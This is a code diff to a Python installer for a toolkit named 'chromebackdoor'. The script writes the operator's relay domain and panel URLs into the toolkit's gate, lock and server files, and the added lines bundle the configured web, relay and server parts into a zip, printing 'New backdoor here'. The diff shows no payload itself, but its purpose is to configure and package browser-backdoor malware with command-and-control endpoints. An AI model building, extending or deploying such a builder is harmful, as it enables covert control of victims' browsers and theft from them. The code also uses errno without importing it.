@@ -1,6 +1,8 @@
 #!usr/bin/env python3
 
 import os,sys
+import shutil
+import random
 
 def logo():
     print """
@@ -12,12 +14,22 @@ def logo():
                                                                                    
     """
 
+def copy(src, dest):
+    try:
+        shutil.copytree(src, dest)
+    except OSError as e:
+        if e.errno == errno.ENOTDIR:
+            shutil.copy(src, dest)
+        else:
+            print('Directory not copied. Error: %s' % e)
+
 def install_relais():
     install_status = 0
     try:
         while install_status != 1:
             domain = raw_input('[*] domain url without web (ex: http://site.com/chromebackdoor/) > ')
             if domain.endswith('/'):
+                copy('../relais/', '../relais_bk/')
                 file_read = open('../relais/index.php').read()
                 if "//domain" in file_read:
                     code = file_read.replace('//domain', '$domain = "'+domain+'";\n')
@@ -31,6 +43,22 @@ def install_relais():
                         file_write.write(code)
                         file_write.close()
                     print "Install relais [OK]"
+                    output_filename = str(random.randint(1000,99999))
+                    if(os.path.isdir('../backdoor/')):
+                        shutil.rmtree('../backdoor/')
+                    os.makedirs('../backdoor/')
+                    copy('../web','../backdoor/web/')
+                    copy('../relais', '../backdoor/relais/')
+                    copy('../server', '../backdoor/server/')
+                    shutil.make_archive(output_filename, 'zip', '../backdoor/')
+                    shutil.rmtree('../backdoor/')
+                    shutil.rmtree('../web/')
+                    shutil.rmtree('../relais/')
+                    shutil.rmtree('../server/')
+                    shutil.move('../web_bk/', '../web/')
+                    shutil.move('../relais_bk/', '../relais/')
+                    shutil.move('../server_bk/', '../server/')
+                    print "New backdoor here : " + os.getcwd() + '/' +output_filename+'.zip'
                     install_status = 1
             else:
                 print "Please use correct url ex: http://site.com/chromebackdoor/"
@@ -53,6 +81,7 @@ def install_server():
             if check == 'y' or check == 'Y':
                 get_url = 2
         if(os.path.isfile('../server/js/check.js')):
+            copy('../server/','../server_bk/')
             file_read = open('../server/js/check.js').read()
             if "//settings" in file_read:
                 code = file_read.replace("//settings", "\n\n    var server_web = '"+panel+"'\n    var lock_page = '"+relais+"/lock.php' \n    var gate_page = '"+relais+"/index.php'\n")
@@ -60,6 +89,7 @@ def install_server():
                 file_write.write(code)
                 file_write.close()
                 print "Server config [OK]"
+                copy('../web/','../web_bk/')
                 file_read = open('../web/show.php').read()
                 if "//settings" in file_read:
                     code = file_read.replace('//settings', "var server_web = '"+panel+"'\n var gate_page = 'web/show.php'")
